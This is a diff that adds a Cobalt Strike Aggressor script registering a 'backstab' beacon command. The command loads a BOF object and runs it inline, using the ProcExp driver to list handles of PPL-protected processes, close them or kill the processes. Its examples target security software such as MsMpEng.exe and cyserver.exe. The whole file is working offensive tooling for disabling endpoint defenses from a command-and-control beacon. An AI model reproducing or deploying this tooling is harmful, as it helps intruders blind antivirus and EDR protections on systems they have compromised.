@@ -1,0 +1,111 @@
+# subroutine to parse options for script.
+# Returns options as a hash
+sub ops {
+	local('$count');
+	$count = 0;
+	%arguments = ohash();
+	foreach $arg ($1) {
+		if ($count > 0) {
+			if ($arg ismatch '/.*:.*') {
+				$arg = replace($arg, '\A/',"");
+				($key $val) = split(":", $arg, 2);
+				%arguments[$key] = $val;
+			}
+			else if ($arg ismatch '/.*') {
+				$arg = replace($arg, '\A/',"");
+				%arguments[$arg] = "TRUE";
+			}
+			else {
+				%arguments["$count"] = $arg;
+			}
+		}
+		$count = $count + 1;
+	}
+	return (%arguments);
+}
+
+
+alias backstab {
+	local('$args $name $pid $listh $killproc $closeh $driverpath $servicename $unloaddriver %params');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("backstab"));
+		return;
+	}
+	
+	$name = "";
+	$pid = "";
+	$killproc = 0;
+	$listh = 0;
+	$closeh = "";
+	$driverpath = "";
+	$servicename = "";
+	$unloaddriver = 0;
+	%params = ops(@_);
+	@keys = keys(%params);
+	if("NAME" in @keys) { $name = %params["NAME"]; }
+	if("PID" in @keys) { $pid = %params["PID"]; }
+	if("KILL" in @keys) {$killproc = 1; }
+	if("LIST" in @keys) {$listh = 1; }
+	if("CLOSE" in @keys) { $closeh = %params["CLOSE"]; }
+	if("DRIVER" in @keys) { $driverpath = %params["DRIVER"]; }
+	if("SERVICE" in @keys) { $servicename = %params["SERVICE"]; }
+	if("UNLOAD" in @keys) {$unloaddriver = 1; }
+	
+	#Logic checks.  Only 1 of name/pid allowed, only 1 of killproc/listh/closeh allowed.
+	if((($name ne "")&&($pid ne ""))||(($name eq "")&&($pid eq ""))||(($killproc != 0)&&($listh != 0)&&($closeh ne ""))||(($killproc != 0)&&($listh != 0))||(($killproc != 0)&&($closeh ne ""))||(($listh != 0)&&($closeh ne ""))||(($killproc == 0)&&($listh == 0)&&($closeh eq ""))) 
+	{
+		berror($1, beacon_command_detail("backstab"));
+		return;
+	}
+	
+	#Some error handling.  Prevent people from passing args in using /NAME MsMpEng.exe instead of intended /NAME:MsMpEng.exe
+	if(($name eq "TRUE")||($pid eq "TRUE")||($closeh eq "TRUE")||($driverpath eq "TRUE")||($servicename eq "TRUE"))
+	{
+		berror($1, beacon_command_detail("backstab"));
+		return;
+	}
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("backstab.x64.o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	
+	btask($1, "Running Backstab...");
+	$args = bof_pack($1, "zzsszZZs", $name, $pid, $killproc, $listh, $closeh, $driverpath, $servicename, $unloaddriver);
+	beacon_inline_execute($1, $data, "go", $args);
+
+}
+
+beacon_command_register(
+	"backstab",
+	"List handles or kill a PPL protected process",
+	"
+Command: backstab
+Summary: This command will kill a PPL protected process.
+
+Usage: backstab </NAME:processname.exe || /PID:processpid> [options]
+        /NAME,             Choose process by name, including the .exe suffix
+        /PID,              Choose process by PID
+        /LIST,             List handles of protected process
+        /KILL,             Kill the protected process by closing its handles
+        /CLOSE,            Close a specific handle
+        /DRIVER,           Specify path to where ProcExp will be extracted
+        /SERVICE,          Specify service name registry key
+        /UNLOAD,           (attempt to) Unload ProcExp driver
+
+Notes:
+	You MUST specify either /NAME -OR- /PID
+	You MUST specify ONE of /LIST,/KILL,/CLOSE
+	You MAY specify none||either||both /DRIVER,/SERVICE
+	Options /NAME, /PID, /CLOSE, /DRIVER, /SERVICE require an argument in format /NAME:argument
+
+Examples:
+        backstab /NAME:cyserver.exe /KILL         		[kill cyserver]
+        backstab /NAME:cyserver.exe /CLOSE:E4C       		[Close handle E4C of cyserver]
+        backstab /NAME:cyserver.exe /LIST        	 	[list all handles of cyserver]
+        backstab /PID:4326 /KILL /DRIVER:c:\\driver.sys    	[kill protected process with PID 4326, extract ProcExp driver to C:\\driver.sys]
+"
+);
